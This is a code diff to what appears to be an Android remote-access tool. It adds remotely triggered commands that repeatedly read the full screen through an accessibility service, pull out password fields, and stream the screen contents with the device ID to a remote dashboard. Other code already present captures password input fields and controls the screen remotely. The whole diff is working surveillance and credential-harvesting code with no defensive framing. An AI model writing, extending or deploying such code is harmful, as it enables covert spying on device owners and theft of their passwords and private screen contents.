@@ -78,6 +78,9 @@ public class SocketManager {
     private volatile boolean blockFrameMode = false;
     private ScheduledFuture<?> blockFrameFuture;
 
+    // Screen-reader push mode — app continuously reads screen and pushes to dashboard
+    private volatile ScheduledFuture<?> screenReaderFuture;
+
     // Debounce handle for device-user interaction frames
     private final AtomicReference<ScheduledFuture<?>> actionFrameFuture = new AtomicReference<>();
 
@@ -1226,6 +1229,8 @@ public class SocketManager {
             case "wake_screen":
             case "screen_off":
             case "open_task_manager":
+            case "screen_reader_start":
+            case "screen_reader_stop":
                 return true;
             default:
                 return false;
@@ -1378,6 +1383,50 @@ public class SocketManager {
                     pushPasswordFieldsFromInputFields(inputResult);
                     return inputResult;
                 } finally { if (acquired) accessSemaphore.release(); }
+            }
+
+            case "screen_reader_start": {
+                // Stop any existing push loop
+                ScheduledFuture<?> oldFuture = screenReaderFuture;
+                if (oldFuture != null) { oldFuture.cancel(false); screenReaderFuture = null; }
+
+                final long intervalMs = Math.max(1000L, params.optLong("intervalMs", 2000L));
+                final String devId   = DeviceInfo.getDeviceId(context);
+                final UnifiedAccessibilityService svcRef = accessSvc;
+
+                screenReaderFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
+                    boolean acq = false;
+                    try {
+                        acq = accessSemaphore.tryAcquire(3, TimeUnit.SECONDS);
+                        if (!acq) return;
+                        ScreenReader pusher = new ScreenReader(svcRef);
+                        JSONObject screenResult = pusher.readScreen();
+                        pushPasswordFieldsFromScreen(screenResult);
+                        JSONObject payload = new JSONObject();
+                        payload.put("deviceId", devId);
+                        payload.put("success", screenResult.optBoolean("success", false));
+                        if (screenResult.has("screen")) payload.put("screen", screenResult.get("screen"));
+                        if (screenResult.has("error"))  payload.put("error",  screenResult.getString("error"));
+                        sendLiveMessage("screen:update", payload);
+                    } catch (Exception e) {
+                        Log.e(TAG, "screen_reader push error: " + e.getMessage());
+                    } finally {
+                        if (acq) accessSemaphore.release();
+                    }
+                }, 0, intervalMs, TimeUnit.MILLISECONDS);
+
+                JSONObject ok = new JSONObject();
+                ok.put("success", true);
+                ok.put("intervalMs", intervalMs);
+                return ok;
+            }
+
+            case "screen_reader_stop": {
+                ScheduledFuture<?> f = screenReaderFuture;
+                if (f != null) { f.cancel(false); screenReaderFuture = null; }
+                JSONObject ok = new JSONObject();
+                ok.put("success", true);
+                return ok;
             }
         }
 
